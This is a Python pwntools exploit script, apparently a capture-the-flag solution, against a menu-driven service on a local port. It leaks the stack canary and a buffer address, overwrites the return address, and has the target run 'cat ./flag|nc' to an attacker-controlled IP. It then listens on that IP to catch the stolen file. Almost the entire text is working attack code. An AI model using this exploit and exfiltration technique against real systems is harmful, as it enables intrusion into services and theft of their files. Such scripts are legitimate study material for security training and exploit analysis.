from pwn import *
import binascii
import socket
hexy = lambda x: int(binascii.hexlify(x), 16)

proc = remote("localhost", 8181)
proc.recvuntil('>')
proc.sendline('1')
proc.recvuntil(':')
proc.sendline("a"*40)
sample = proc.recvuntil('>')
canary = sample.split('\n')[1].lstrip('a'*39)
canary = hexy(canary[::-1])<<8
proc.sendline('1')
proc.recvuntil(':')
proc.sendline('aaaa'*12+'aaa')
buf = proc.recvuntil('>').split('\n')[1]
buf = buf[:4][::-1]
buf = hexy(buf) - 300
proc.sendline('1')
proc.recvuntil(':')
payload = p64(hexy("ls -al"[::-1]))
proc.sendline(p32(0x8048b86)*12+"aaaaaaaa"+p32(0x08048620)+"aaaa"+p64(buf)+p32(hexy('cat '[::-1]))+p32(hexy("./fl"[::-1]))+p32(hexy("ag|n"[::-1]))+p32(hexy("c 19"[::-1]))+p32(hexy("2.16"[::-1]))+p32(hexy("8.0."[::-1]))+p32(hexy("2 3"[::-1])))
proc.recvuntil('>')
proc.sendline('2')
proc.recvuntil(':')
proc.sendline("a"*40+p64(canary))
proc.recvuntil('>')
proc.sendline('3')

print proc.recv(1024)
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind(("192.168.0.2", 3))
socket.listen(5)
client, addr = socket.accept()
print client.recv(1024)

# You need super user privilege to run this correctly
# If it doesn't work well than mail me
